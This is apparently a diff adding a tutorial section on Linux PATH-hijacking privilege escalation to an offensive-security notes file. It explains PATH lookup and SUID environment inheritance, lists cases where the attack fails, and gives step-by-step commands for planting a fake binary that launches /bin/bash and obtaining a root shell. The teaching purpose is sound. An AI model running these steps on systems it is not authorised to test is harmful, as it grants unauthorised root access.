@@ -340,3 +340,129 @@ For more information and a practical guide, [click here](/Offensive_Security/Lin
 
 ---
 
+## PATH Privilege Escalation
+
+### What is PATH?
+
+`PATH` is an environment variable that tells the shell where to look for executables when a command is typed without a full path. The shell searches each directory left to right and runs the first match.
+
+```bash
+echo $PATH
+# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+### How PATH Works
+
+When you type a command, the shell searches each directory in PATH from left to right and executes the first match it finds:
+
+```
+Command typed: ls
+
+Step 1: check /usr/local/sbin/ls  → not found
+Step 2: check /usr/local/bin/ls   → not found
+Step 3: check /usr/sbin/ls        → not found
+Step 4: check /usr/bin/ls         → not found
+Step 5: check /sbin/ls            → not found
+Step 6: check /bin/ls             → FOUND → execute
+```
+
+If you prepend a directory to PATH, it becomes the first place the shell looks:
+
+```bash
+export PATH=/tmp:$PATH
+# PATH is now: /tmp:/usr/local/sbin:/usr/local/bin:...
+
+# typing "ls" now checks /tmp/ls first
+# if /tmp/ls exists → runs it instead of /bin/ls
+```
+
+This is by design for legitimate use cases (e.g. project-local binaries). The privesc opportunity arises when a privileged process uses PATH carelessly.
+
+### Why is it a Privesc Vector?
+
+If a SUID binary or root-owned script calls a command **without its full path**, and you can inject a writable directory at the beginning of PATH, you can create a malicious binary with the same name — it gets executed instead of the real one, with root privileges.
+
+### Does it Require Root Access?
+
+No. `PATH` is just an environment variable — any user can modify their own session's PATH:
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+The vulnerability is not in PATH itself — it's in a SUID binary that calls a command carelessly. When a SUID binary runs, it runs with root's effective UID but **inherits the executing user's environment**, including the modified `$PATH`. Unless the binary explicitly resets PATH, it uses whatever PATH your session has.
+
+### When Does it NOT Work?
+
+|Situation|Result|
+|---|---|
+|Binary uses full paths (`/usr/bin/curl`)|Not exploitable|
+|Binary calls `env -i` to clear environment|Not exploitable|
+|`secure_path` set in sudoers|Sudo ignores your PATH|
+|Binary is not SUID / not run as root|No privilege gain|
+
+### Attack Flow
+
+**1. Find writable directories:**
+
+```bash
+find / -writable -type d 2>/dev/null
+```
+
+Look for unusual writable directories — not `/tmp`, `/dev/shm`, `/run/user/...` (expected), but things like another user's home directory (misconfiguration).
+
+**2. Find a vulnerable SUID binary:**
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+**3. Analyze what commands it calls:**
+
+```bash
+# if strings is available
+strings /path/to/suid_binary
+
+# practical alternative when binutils not installed
+ltrace /path/to/suid_binary
+```
+
+`ltrace` intercepts library calls and prints them in human-readable form. Look for `system("command")` where `command` has no full path.
+
+**4. Create a malicious binary with the same name:**
+
+```bash
+echo '/bin/bash' > /writable/dir/command_name
+chmod +x /writable/dir/command_name
+```
+
+**5. Inject the writable directory at the beginning of PATH:**
+
+```bash
+export PATH=/writable/dir:$PATH
+```
+
+**6. Run the SUID binary:**
+
+```bash
+/path/to/suid_binary
+# calls "command" → finds your malicious version first → spawns bash as root
+```
+
+**7. Restore PATH after the exercise:**
+
+```bash
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+### Key Principles
+
+- Write access to another user's home directory is always a misconfiguration — it enables file planting attacks like PATH hijacking
+- `ltrace` is the practical alternative to `strings` when binutils is not installed
+- The attack only works if the binary calls a command without its full path — always verify with `ltrace` or `strings` before assuming exploitability
+- A SUID binary inherits the executing user's environment — PATH modification requires no root access
+
+For more information and a practical guide, [click here](/Offensive_Security/Linux_Privilege_Escalation/Linux_Privesc_Writeup_PATH.md)
+
+---
+
